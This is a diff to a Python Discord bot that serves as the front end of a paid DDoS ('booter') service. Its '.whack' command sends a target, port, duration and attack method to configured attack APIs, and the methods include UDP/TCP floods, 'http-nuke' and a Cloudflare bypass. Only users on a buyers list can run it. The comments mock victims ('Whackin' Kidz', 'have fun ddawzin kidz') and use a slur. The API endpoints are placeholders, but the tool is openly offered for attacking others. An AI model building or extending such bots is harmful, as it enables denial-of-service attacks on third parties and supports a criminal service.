@@ -1,4 +1,4 @@
-#import all dem shitz
+#import all dem shitz!
 from discord.ext import commands     
 from discord.ext.commands import Bot 
 from os import system                
@@ -10,32 +10,33 @@ import random
 import asyncio   
 from cfonts import render, say                
 
-output = render('     whack', colors=['white', 'red'])
+#variables :/
+output = render('     whack', colors=['white', 'red']) #soopa kool ascii!
 buyers  = [1, 2, 3]              
 admins  = [1, 2, 3]              
-ownerList  = [1, 2, 3] #Put your ID as one of these, as this cannot be changed by discord commands (due to it being the highest perm)
-yourbottoken   = '' #put your bot token here                
+ownerList  = [1, 2, 3] 	#put your ID as one of these, as this cannot be changed by discord commands (due to it being the highest perm)
+yourbottoken   = '' 	#put your bot token here!                
 bot = commands.Bot(command_prefix='.')
 
-#methods (you can add others, these are just placeholders as there is no api added)
+#methods! (you can add others, these are just placeholders as there is no api added)
 l4methods = ['tcp', 'udp', 'std']             
 l7methods = ['http', 'cfbypass', 'http-nuke'] 
 
-#put your api shit here if you're actually gonna use this lol
+#put your api shit here if you're actually gonna use this ass bot lol
 api_data = [
     {
         'api_url':'api url here', 
         'api_key':'api key here',              
-        'max_time':'1200'   #you can change this to whatever tbh
+        'max_time':'1200'   #change the max_time for an attack according to your api
     },
     {
         'api_url':'api url here', 
         'api_key':'api key here',
-        'max_time':'300'    #you can change this to whatever tbh
+        'max_time':'300'    
     }
 ]
 
-#h4x0r pogger cool swag st4tuz
+#h4x0r pogger cool swag st4tuz! (rotating status, you can remove this if you please.)
 async def status_task():
     while True:
         await bot.change_presence(activity=discord.Game(name="Whackin' Kidz /"))
@@ -46,7 +47,10 @@ async def status_task():
         await asyncio.sleep(1.5)
         await bot.change_presence(activity=discord.Game(name="Whackin' Kidz |"))
         await asyncio.sleep(1.5)
- 
+	
+
+#main commands:
+
 #add a buyer to the buyers list.
 @bot.command()
 async def add_buyer(ctx, buyer : int = None):
@@ -130,12 +134,13 @@ async def del_admin(ctx, admin : int = None):
 #this is the 'ddos' command. (I named it whack because that's funny... no? ok...)
 @bot.command()
 async def whack(ctx, method : str = None, target : str = None, port : str = None, time : str = None):
-    #checks if a random noob is using your bot to ddawz people
+	
+    #checks if a random noob is trying to use your bot to attack people
     if ctx.author.id not in buyers:
 	    embed = discord.Embed(title="ARGH!", description="WOAH! You're not a buyer! Stop trying to be naughty! :face_with_symbols_over_mouth:", color=0xa30000)
 	    await ctx.send(embed=embed)
 
-    #if the person using the command is a buyer, then proceed:
+    #if the person using the command is a buyer, then proceed.
     else:
         if method is None or method.upper() == 'noob_needs_help_XD': #checks if the person is a retard and didn't use the right args; if true: sends the 'help' embed.
             l4methodstr = ''
@@ -146,7 +151,8 @@ async def whack(ctx, method : str = None, target : str = None, port : str = None
 
             for m2 in l7methods:
                 l7methodstr = f'{l7methodstr}{m2}\n'
-
+		
+	    #listing how to use.
             embed = discord.Embed(title="How to Use", description=" ", color=0xa30000)
             embed.add_field(name="Command:", value=".whack <method> <target> <port> <time>")
             embed.add_field(name="L4 METHODS:", value=f" {l4methodstr}")
@@ -154,7 +160,7 @@ async def whack(ctx, method : str = None, target : str = None, port : str = None
 
             await ctx.send(embed=embed)
 
-		#check if the user has messed up the args :/
+	#check if the user has messed up the args :/
         elif method is None:
             await ctx.send('Please Give a Method :)')
 
@@ -170,10 +176,11 @@ async def whack(ctx, method : str = None, target : str = None, port : str = None
             embed = discord.Embed(title="You STOOPID!", description="Please give a valid <time> :person_facepalming: ", color=0xa30000)
             await ctx.send(embed=embed)
 
-        #checks complete :D, continue !
+        #checks complete :D, continue!
         else:
             for i in api_data:
                 try:
+	#making the vars blah blah blah
                     api_url = i["api_url"]
                     api_key = i["api_key"]
                     max_time = int(i["max_time"])
@@ -195,7 +202,7 @@ async def whack(ctx, method : str = None, target : str = None, port : str = None
             embed = discord.Embed(title="WHACKED!", description=f"W0w, you WHACKED {target}.", color=0xa30000)
             await ctx.send(embed=embed)
 
-#display suppa kewl ascii + bot info
+#display soopa kool ascii + bot info
 @bot.event
 async def on_ready():
     if name == 'nt':
@@ -206,8 +213,8 @@ async def on_ready():
 
     print(output)
     print(f'{Fore.RED}        Logged into Bot: {Fore.YELLOW}{bot.user.name}{Fore.GREEN}. Bot ID is {Fore.BLUE}{bot.user.id}{Fore.MAGENTA}. Have fun ddawzin kidz.{Fore.RESET}\n')
-    bot.loop.create_task(status_task())
+    bot.loop.create_task(status_task()) #starting the bots rotating status, remove this if you are removing the status.
 
 if __name__ == '__main__':
     init(convert=True)
-    bot.run(yourbottoken)
+    bot.run(yourbottoken) #BIRTH! :P
